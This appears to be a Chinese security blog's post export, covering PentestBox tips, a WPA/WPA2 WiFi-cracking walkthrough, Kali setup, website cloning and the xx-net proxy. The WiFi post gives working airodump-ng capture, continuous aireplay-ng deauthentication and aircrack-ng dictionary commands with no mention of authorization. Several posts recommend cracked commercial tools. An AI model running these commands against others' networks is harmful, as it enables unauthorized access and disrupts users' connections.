12PentestBox是一个开源项目，让在PentestBox使用的所有文件都存在于它的Github上库。终端下输入：update 从它的Github上库，如果有任何更改，然后显示菜单将先进行自我更新。如果没没有互联网连接，脚本会等待一段时间，然后显示菜单。 软件卸载123在toolsmanager 的软件目录里面 我们现在想卸载已经安装过的软件的话，直接键入uninstall + 软件名假如这里我们想卸载 xssless，然后键入uninstall xssless，这样就会卸载 xssless 键盘快捷键1234CTRL + T ：要打开新的标签页CTRL + C ：要关闭脚本/程序运行。CTRL + w ：这将关闭当前活动的控制台。ALT +Enter ：Pentestbox 会去全屏。 安装后的调试因为是国外开源项目的原因，有些配置不符合我们国内的本土风情，举个例子：PentestBox 面封装的atom 编辑器是无法输入汉语的，而且插件也会出现一些问题，比如minimap等得重新配置解决方法：将自己原来的atom安装的文里件夹替换PentestBox里面的atom即可C:\Users\CTF\AppData\Local\atom\app-1.12.6 (‘CTF’是我自己电脑的用户名)PentestBox封装Burpsuite的是Free版本的，功能上自然比不上 国内的专业破解版的Burpsuite解决方法:把专业版破解版的burpsuite替换进去，并重命名 即可。 添加自己的工具很多情况下自己的工具 toolsmanager或默认PentestBox未安装。可以按照下面的指南 来手动添加自己的工具：需要做两件事情：1.下载/克隆工具文，2.设置别名别名是基本上是需要PentestBox控制台通过，例如终端命令的SqlMap是一个别名访问sqlmap。 基于Python的工具12首先复制文件到 C:/PentestBox/bin/customtools/下添加一个别名:编辑customaliases文件 位于/PentestBox/bin/customtools/文件夹下。 12例如，如果你需要添加一个别名hello的工具，那么它的别名是 hello=python "%pentestbox_ROOT%\bin\customtools\Hello.py" $*上述行添加到customaliases并保存文件 复制到文件夹下： 然后编辑 customaliases文件重启你的 PentestBox ，即可生效 基于exe的工具1231.下载/克隆工具文件。2.设置别名 方法同上， 只是别名这里 设置的格式为：tool=&quot;%pentestbox_ROOT%\bin\customtools\tool.exe&quot; $*举例：我们添加个金典的 小葵解密工具 编辑 customaliases文件效果如下： 基于Ruby的工具和Java的工具语法格式:123Java ：tool=start javaw -jar &quot;%pentestbox_ROOT%\bin\customtools\tool.jar&quot; $*Ruby : wpscan=ruby &quot;%pentestbox_ROOT%\bin\customtools\wpscan\wpscan.rb&quot; $* 在PentestBox 中添加自己的Java 和 Ruby工具，方法的原理是一样的，只是在编辑 customaliases文件 的时候，语法格式有点区别，Java 和 Ruby 的工具格式 参考上面的格式。 通过网络共享PentestBox考虑你想要在你的办公室，实验室等使用多台计算机上PentestBox喜欢而不是在每个计算机上安装PentestBox的环境中，你可以只安装一台计算机上，共享该文件夹作为一个驱动器上的其他计算机在同一个网络。更改读取权限读/写，并单击共享。现在在局域网的其他电脑上的的 资源管理器 中的 网络 可以看到共享的文件夹最后，你可以像你所使用的电脑上安装使用PentestBox。]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>PentestBox</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无线安全之破解WPA/WPA2 加密ＷiFi]]></title>
    <url>%2F2016%2F10%2Fwifi.html</url>
    <content type="text"><![CDATA[由于古老的ＷPE加密的WiFi已经几乎没有了，所以这里我就不去细说如何破解WPE加密的ＷiFi了。今天就来聊聊 如何来使用Kali Linux来破解Wpa/Wpa2加密的WiFi。本次破解WiFi使用的是Kali Linux下经典的aircrack-ng 准备可以使用无线网络的Kali Linux由于古老的ＷPE加密的WiFi已经几乎没有了，所以这里我就不去细说如何破解WPE加密的ＷiFi了。今天就来聊聊 如何来使用Kali Linux来破解Wpa/Wpa2加密的WiFi。 本次破解WiFi使用的是Kali Linux下经典的aircrack-ng 抓包首先查看 自己的 无线设备的网卡，我这里 无线设备就是 ：wlan01ifconfig 然后查看周围无线网络1airodump-ng wlan0 如果报错：ioctl(SIOCSIWMODE) failed: Device or resource busy 的话，那么是因为网卡没有启用监听模式这个时候 卸载设备，设置monitor模式，重新启用网卡即可命令如下：123ifconfig wlan0 downiwconfig wlan0 mode monitorifconfig wlan0 up 运行 airodump-ng wlan0 查看的无线信息如下：这里简单解释下一些基本的参数：12345678BSSID--无线AP（路由器）的MAC地址，如果你想PJ哪个路由器的密码就把这个信息记下来备用。PWR--这个值的大小反应信号的强弱，越大越好。很重要！！！Beacons--准确的含义忘记了，大致就是反应客户端和AP的数据交换情况，通常此值不断变化。#Data--这个值非常重要，直接影响到密码破解的时间长短，如果有用户正在下载文件或看电影等大量数据传输的话，此值增长较快。 CH--工作频道。MB--连接速度ENC--编码方式。通常有WEP、WPA、TKIP等方式，本文所介绍的方法在WEP下测试100%成功，其余方式本人 并未验证。ESSID--可以简单的理解为局域网的名称，就是通常我们在搜索无线网络时看到的列表里面的各个网络的名称。 接下来开始抓我们想要抓的WiFi的包，这里以ESSID名称为 Cisco的为例：1airodump-ng -w Ciscotest -c 1 --bssid D8:24:BD:2F:C5:50 wlan0 解释一下：用 wlan0 这个无线设备来抓取 bssid为 D8:24:BD:2F:C5:50，在Channel(频道1)上的WiFi的包，并保持在本地home文件夹下，保持的包名称为：Ciscotest-w 后面填写 自定义的握手包的名称 -c 后面填写 目标WiFi的频道 --bssid 后面填写 目标WiFi的bssid 最后 填写你的wifi设备这个时候就开始抓包了效果如下：现在右上角的状态是：fixed channel wlan0 表示正在抓包为了加速握手包的获取，我们可以使用aireplay来给AP发送断开包：1aireplay-ng -0 0 -a D8:24:BD:2F:C5:50 wlan0 解释：-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值,wlan0 你的无线设备这里如果 冲突攻击模式 一次执行不成功的话，那么就再来几次，直至 抓到包为止，本图中，我就执行了2次冲突攻击模式才 成功。执行WiFi攻击的时候，我们一般调用3个窗口：左上角 是 扫描 周围的WiFi右上角 是 抓取目标WiFi的握手包最下面 是 执行冲突攻击模式 用来加快握手包的获取通过观察 抓包窗口的右上角 可以判断 是否 获取到握手包此刻 右上角显示为 : WPA handshake:D8:24:BD:2F:C5:50这表示已经获取到了握手包了。找到文件夹下的握手包这里的 .cap 文件 就是 我们要得到的握手包这样就成功了一大半了，剩下的就是 用 工具来跑 这个握手包了。 Kali Linux下使用aircrack-ng来跑包跑包很关键，成功与否在于WiFi密码的复杂程度和字典的质量，当然与你的CPU的速度也息息相关。在 i5 3470 CPU的台式机 跑字典速度 大概是10000 个/秒在 i7 4710MQ CPU的笔记本上 跑字典速度 大概是 40000 个/秒（这个时候温度会很高） 鲁大师 节能模式下跑 速度大概是 30000 个/秒，而且温度不会飚高 。 下面来在Kali下使用自带的aircrack-ng来跑包：格式是：1aircrack-ng 握手包 -w 字典 跑包示例:1aircrack-ng &apos;/home/kali/Ciscotest-01.cap&apos; -w &apos;/media/kali/iso/life/图片/零散/图片马/HTML/弱口令集合/弱口令集合/5万密码.txt&apos; 我这里用的一个5万密码字典，密码在最后一行： Windows下使用EWSA来跑包EWSA 是目前来说公认跑包最快的软件了，因为它支持 CPU和GPU一起跑包，这样就大大提高了跑包的速率了 。用由于这款软件是收费的，这里我就上传一下本人使用的 5.9EWSA破解版本(自行百度)EWSA是图形化操作的，所以使用起来几乎没有什么门槛。首先导入包，然后选中字典，最后爆破。就是这么简单。这里要注意的就是,EWSA 默认开启密码突变选项，如果这里不取消勾选的话，破解速度就会慢很多。下面来演示下，windows下使用eswa来跑字典包(速度比kali下要快很多)：]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>Kali Linux</tag>
        <tag>wifi破解</tag>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开启你的kali linux DIY之旅(基于kali linux2016.2)]]></title>
    <url>%2F2016%2F10%2Fdiykali.html</url>
    <content type="text"><![CDATA[这些都是我当初折腾kali linux总结出的经验，曾经绕了很多弯路，付出了很多，有时候可能一天都在安装系统，而且坏了一个32GB的固态硬盘。。。总之一路上不是那么顺利，如今我以过来人的身份写下这篇kali diy文章，只为了可以让后人可以少走弯路，真正的发挥kali的优点，发现kali linux之美。 更新源首先 是kali2016.2更新源的问题，网上找了好久，都不是很满意。后来把kali 2016.2安装到实体机中才发现，里面自带了更新源。下面我把这个官方自带更新源分享出来(速度蛮快的)12deb http://http.kali.org/kali kali-rolling main contrib non-freedeb-src http://http.kali.org/kali kali-rolling main contrib non-free 很多人拿到更新源就按照百度上面介绍的那样,得执行好几个命令。其实不必这样费时费力的,拿到kali 更新源其实很简单 只执行一条命令即可1apt-get update 就是这么简单，剩下的想安装什么软件的话，只需要执行：1apt-get install 软件名 对就是这么简单。这里的难点在于，软件名 我们并不知道，不知道到底有哪些软件可以安装。别急 下面我来慢慢说来。 添加用户首先你得添加个用户，这是为什么呢？因为 kali 下有不少软件要求 必须在 非root用户下才可以运行的。比如网易云音乐在kali 2016.2下就无法运行，就是因为是root用户的缘故。在 设置-用户 里面 添加用户效果图如下:这里注意几点:1.语言设置 汉语2.登录密码 得满足复杂度要求3.勾选自动登录 软件安装软件安装这里是重头戏了，很多人都是卡在了不知道kali如何安装软件所以kali就半途而废了。如果你的kali日常必备软件都是有的话，就会慢慢喜欢上kali的。这里我推荐kali不要安装在虚拟机中，因为实体机和虚拟机的效果是天差地别的。本人建议把kali linux安装到U盘上，这样既方便又减少了处理引导问题的麻烦。总之，kali是个很优秀的系统，个人觉得 比 windws 要酷炫好用。 gdebi我们安装的第一个软件是:gdebi这个是辅助安装软件工具，有了gdebi 这样安装其他软件时，可以节省好多时间。直接可以图形化安装 deb 的安装包。终端安装输入：1apt-get install gdebi 注:安装软件得切换到 ==root用户==才可以安装安装gdebi后的效果图： 汉化火狐浏览器终端直接输入:1apt-get install iceweasel-l10n-zh-cn kali 2016.2汉化火狐浏览器的效果图： 搜狗输入法kali 2016.2安装搜狗输入法 这里得借助前面安装的 gdebi 程序来安装首先官网下载 deb安装包：http://pinyin.sogou.com/linux/?r=pinyin然后 右键 deb包 选择 gdebi打开 即可安装 TeamviewerTeamviewer是一款功能强悍、跨平台的远端控制软件。安装也不算很难。官网下载deb安装包：https://www.teamviewer.com/zhcn/download/linux/用gdebi 辅助安装工具右键安装，提示报错：这是因为64位的系统安装32的版本会提示缺少 32位运行库Kali Llinux2016.2安装32运行库方法如下:以root身份登录1234su rootdpkg --add-architecture i386apt-get updateapt-get install libc6:i386 执行完这4个命令后，再用gdebi 来安装teamviewer就可以成功安装了。期间如果报错的话，就按照提示在终端下输入命令修复一下即可：以root身份登录，终端下输入：1apt-get install -f Kali Linux安装Teamviewer12.0的效果图如下: Virtual boxkali 2016.2安装 virtual box其实很简单，只需要一条命令即可：1apt-get install virtualbox kali下的virtualbox的安装还是很有必要的，毕竟有时候我们不得不用windows系统来处理一些事情：kali2016.2安装完virtualbox效果图： 安装chrome内核浏览器这里我不直接推荐 chrome浏览器，个人觉得 其他基于chrome内核开发的浏览器也是蛮不错的 Opera浏览器kali安装Opera浏览器的话，直接去官网下载deb安装包，然后用 gdebi 安装即可：kali安装opera浏览器效果图： Vivaldi浏览器Vivaldi浏览器也是个蛮个性的浏览器，基于chrome内核，速度很快，外观美观个性。也是下载 deb 包，然后使用 gdebi安装由于官网经常奔溃掉，这里我提供vivaldi linux的安装链接：点击下载 vivaldi for linux 64位deb版效果图: DIY你的chrome内核浏览器chrome浏览器下有很多优秀的插件，安装插件只要把插件拖动到 浏览器的扩展管理即可安装。这里我就简单推荐几个:广告终结者 ：直接去掉 优酷 广告哦 很强大SwitchyOmega ：burp代理神器，配合xx-net还可以科学上网哦Infinity新标签页 ： vokoscreenlinux下的屏幕录像软件，小巧实用。终端输入命令直接安装：1apt-get install vokoscreen kali下屏幕录像软件vokoscreen安装完效果图： remminalinux下远程桌面管理软件，小巧强大，支持 RDP、SFTP、SSH、VNC协议，足够我们日常使用了终端输入命令直接安装：1apt-get install remmina kali下远程桌面、VNC、SSH、SFTP客户端安装完效果图： 网易云音乐官网下载 deepin 版本的deb安装包，然后用 gdebi安装，用==非root用户==打开官网下载： http://music.163.com/#/download博客迁移，以前的图失效了，就去贴吧找了张 wine下的图 凑个数吧 =，= Audacious本地音乐播放器,其运行在POSIX兼容系统上，如Linux、Audacious使用Plugin机制来实现各种功能。在大部分的系统上，Audacious已默认安装好一套已默认安装好一套Plugin，提供播放一些音乐格式的能力，如MP3、Ogg Vorbis、FLAC等网易云需要有网络的时候才可以使用，离线的话，不妨安装Audacious吧，是linux下一款不错的音乐播放器。安装很简单，终端下输入：1apt-get install audacious kali安装完audacious本地音乐播放器效果图： VLCVLC多媒体播放器（最初为VideoLAN Client，是VideoLAN计划的开放源代码多媒体播放器。）几乎能播放你所有的视频文件。安装很简单，终端下输入：1apt-get install vlc kali安装vlc视频播放器效果图: 笔记软件TomboyTomboy是小巧实用的桌面便签软件,很方便我们记录一些零散的东西。Tomboy安装后的中文名称是:啊贴便签安装也很简单，终端下安装输入:1apt-get install tomboy Leanote（蚂蚁笔记）蚂蚁笔记是用go编写的web云笔记，支持linux客户端，代码高亮，公开为博客。非常强大。官网下载：http://app.leanote.com安装使用很简单，直接解压，点击 Leanote 运行即可 ZIM桌面维基zim桌面维基是Kali Linux下自带的笔记软件，功能也挺强大的，界面蛮漂亮的。 代码编辑器kali下代码编辑器推荐当今主流的3种visualcode atom sublime text3 (自行百度下载)安装很简单，直接下载deb安装包，使用 gdebi安装即可. 文档管理器Kali下的文档管理器是原生的PDF阅读器，和Mac OS下是同款阅读器。把文档管理器固定在 收藏夹下 还会有惊喜。 小结这些都是我当初折腾kali linux总结出的经验，曾经绕了很多弯路，付出了很多，有时候可能一天都在安装系统，而且坏了一个32GB的固态硬盘。。。总之一路上不是那么顺利，如今我以过来人的身份写下这篇kali diy文章，只为了可以让后人可以少走弯路，真正的发挥kali的优点，发现kali linux之美。]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>diy</tag>
        <tag>Kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集之网站镜像克隆]]></title>
    <url>%2F2016%2F10%2Fweb.html</url>
    <content type="text"><![CDATA[一个成功的渗透测试人员，在进行一次成功的渗透测试之前，必须能够获得尽可能多的信息。有时候复制组织的整个网站进行离线评估更有效。这可以使用自动化工具设定搜索条件，或者仅对当前站点改变的敏感信息进行镜像复制。当离线时，拥有 一份镜像进行持续观察很有效。 前言一个成功的渗透测试人员，在进行一次成功的渗透测试之前，必须能够获得尽可能多的信息。有时候复制组织的整个网站进行离线评估更有效。这可以使用自动化工具设定搜索条件，或者仅对当前站点改变的敏感信息进行镜像复制。当离线时，拥有 一份镜像进行持续观察很有效。Wooyun被封杀，现在网上还有很多Wooyun镜像站来继续发挥Wooyun的预热那样。镜像网站不会复制动态内容，也不会复制网站的中间件，比如:数据库等，因此，这并不是对所有渗透测试环境都适用。我个人一般都是用这些工具来 “盗取” 炫酷的html5网站（嘘 ~~~），有时候用它离线存储一些网站，总之挺实用的。 使用wget复制克隆网站介绍Kali linux默认按照了wget工具，它简单使用，Pentest Box中也集成了wget。只要在终端下敲几个命令，就可以下载整个网站的html文件。wget不能复制服务器的程序页面，例如PHP脚本页面。 使用方法终端下输入:1wget -m -p -E -k -K -np -v http://www.baidu.com 这样就会把百度的首页复制下来，就是这么简单粗暴。这里使用了一连串的参数，可以使用man命令来查看 wget的手册：1man wget wget的主要参数如下:12345m:镜像，选择该选项适用于Web站点 p页面获先决条件，该选项确保 包含了请求的 图片和css脚本文件被下载(这样可以更好的复制 html5的站点) E:适用扩展，这可以在本地另存为一个html文件 k:转换链接，确保文件被转换，用于本地浏览 K:转换备份文件，将会以orig为后缀作为原始文件 从组织的Web服务器传送的文件将会存储在复制的网站名称命名的文件夹中。复制网站时，可能会发生错误，尤其是在复制动态脚本页面的时候，这是因为生成页面的大部分代码是有动态脚本创建的，大部分站点的应用程序是不能访问到的。 注：文件一旦被下载，切忌不可以让其他人浏览和重新发布站点，这回违反版权法。 实战克隆下面来 实战用wget来克隆 小米官方HTML5引导页： 使用HTTrack复制克隆网站介绍HTTrack是一款免费的离线浏览器工具，和wget克隆复制镜像差不多，从服务器抓取HTML文件、图片、以及其他css文件并存储到你的计算机上。Kali 2.0起默认预装了 HTTrack。 使用方法终端下输入:1httrack 如果没有安装这个工具的话，那就现场安装一下吧，只需要2个命令:12apt-get updateapt-get install httrack 这里提示要输入项目名称、存放网站的路径（默认为 /root/website） 和要克隆的目标站 我们这里以 搜狗浏览器官网为例我们自定义输入test 然后 按下 回车1sougou 然后默认路径 回车12```输入想要克隆的网站 http://ie.sougou.com`` 下面HTTrack提供了一些选项，我们一般选择第二本选项Mirror Web Site(s) with Wizard（具有向导递归层级的镜像网站） 输入:2`回车 回车 回车 后面的一些基本设置 一般一直回车下去 直到网站开始克隆为止，HTTrack 就开始进行网站克隆了。 小结个人认为：wget操作简单方便，但是克隆效果不及 HTTrack；HTTrack虽然比wget稍微繁琐了一点，但是在爬一个大型网站上面完整性要优于wget。 对了，最后再提醒一下：注意版权。]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>Kali Linux</tag>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xx-net科学上网简明使用教程]]></title>
    <url>%2F2016%2F09%2Fxxnet.html</url>
    <content type="text"><![CDATA[简介继psiphon3、lantern、shadowsocks后，翻 土啬 界就来个新角色：xx-net 这张图是.2016.8.30日Google最新的搜索结果，还是可以看出这款工具的火爆程度的，关于它使用的超详细的教程可以参考官方教程，这里我只是肤浅的讲解下如何在Windows、Mac os、Linux平台上使用xx-net进行科学上网。 软件准备chrome内核的浏览器、xx-net、SwitchOmega chrome浏览器插件(已经集成在了xx-net下SwitchyOmega文件夹中)首先浏览器安装SwitchOmega插件，然后在SwitchOmega选项中选项 - 导入/导出 - 备份文件按恢复然后找到xx-net目录下SwitchOmega目录下的bak备份文件。浏览器选择xx-net自己的切换模式 Windows下安装首先解压xx-net到你平时安装软件的目录下，然后双击 名为 start.bat。然后你的默认浏览器就会自动的打开了,访问 http://localhost:8085/点击 显示详细信息，如下图： Mac OS下安装本次是在Mac OS X EI Capitan 10.11.6的版本下来测试xx-net的，进展还算是顺利。前面和windows一样，这里在 运行start.sh 文件的时候，在终端下 sudo 直接运行拖动到 终端下 的start.sh的文件然后也是 在mac 下的 chome内核的浏览器里面 手动导入 证书即可，然后 就是大概等待一会吧，这个时候表急，后台让 xx-net自己去扫 ip资源吧，你可以选择上上网，看看暴走大事件什么的都是不错的选择。啦啦啦~看下面 扫描后的效果:IP数量变多了，IP延迟降低了然后可以秒开google了 Linux 安装本次是在Deepin Linux下来测试xx-net的，一切还都顺利。这里补充下Deepin Linux真的是个不错的Linux系统，软件的生态很好，顺便附上精美截图：不多说了，感兴趣的朋友可以自己去体验下哦。 下面我们来继续说xx-net在Linux下的安装方法：前面安装和windows下操作是一样的，这里不多说主要提一下 如何运行start.sh这个文件直接把start.sh拖到终端下 回车运行一般情况下 会提示权限不够的， 这个时候 得切换到root权限来运行，如过root权限运行还是不可以运行这个文件的话，这个时候得手动把start.sh 赋予最高权限1chmod 777 start.sh ok 了这个时候，你会发现你的终端下正在扫描ip，这个时候把这个终端最小化，让它慢慢扫就好了. 小结本文没有太多的技术含量，而且对xx-net的研究也并不深入，xx-net的几种模式和部署私有的APPID 这里我也没有提到，这里我写这篇文章主要就是把xx-net介绍给大家，感兴趣的朋友可以去深入研究，写出xx-net的更深入的博文，那么这样我就相当于是抛砖引玉了，这篇文章也就没有白写了。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
</search>
